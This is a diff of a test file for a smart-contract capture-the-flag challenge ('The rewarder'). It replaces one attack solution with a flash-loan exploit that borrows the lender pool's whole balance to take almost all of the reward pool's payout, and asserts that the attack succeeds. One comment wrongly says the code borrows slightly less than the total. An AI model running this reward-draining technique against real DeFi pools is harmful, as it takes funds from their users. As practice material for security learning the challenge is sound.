@@ -69,25 +69,42 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
-        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
-        const AttackerFactory = await ethers.getContractFactory('RewarderAttacker', player);
-        const AttackerContract = await AttackerFactory.deploy(
-            rewarderPool.address,
+        const ReceiveFlashLoanFactory = await ethers.getContractFactory('ReceiveFlashLoan', player);
+        
+        const receiver = await ReceiveFlashLoanFactory.deploy(
             flashLoanPool.address,
-            liquidityToken.address,
-            rewardToken.address
+            rewarderPool.address,
+            liquidityToken.address
         );
-        await AttackerContract.attack();
-        // borrow DVT tokens as much as we can
-        // Deposit the tokens to the pool
-        // "wait" five days
-        // claim rewards
-        // withdraw the rewards
-        // Pay back the loan
+    
+        // Determine how much to borrow. We take a small amount less than the total
+        // available to account for rounding errors.
+        const borrowAmount = TOKENS_IN_LENDER_POOL;
+    
+        console.log((await liquidityToken.balanceOf(player.address)).toString());
+        console.log((await liquidityToken.balanceOf(flashLoanPool.address)).toString());
+        console.log(borrowAmount.toString());
+
+        // Initiate the flash loan
+        await receiver.executeFlashLoan(borrowAmount);
+    
+        // The player should have earned almost all the rewards
+        expect(
+            await rewardToken.balanceOf(player.address)
+        ).to.be.gt((await rewarderPool.REWARDS()).sub(10n**17n));
+    
+        // The total token supply of the liquidity token should remain the same,
+        // because we returned the flash loan.
+        expect(
+            await liquidityToken.totalSupply()
+        ).to.be.eq(TOKENS_IN_LENDER_POOL);
+
+        // Check the actual balance of the flashLoanPool
+        const actualTokensInLenderPool = await liquidityToken.balanceOf(flashLoanPool.address);
+        expect(actualTokensInLenderPool).to.be.eq(TOKENS_IN_LENDER_POOL);
     });
     
-    
+
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Only one round must have taken place
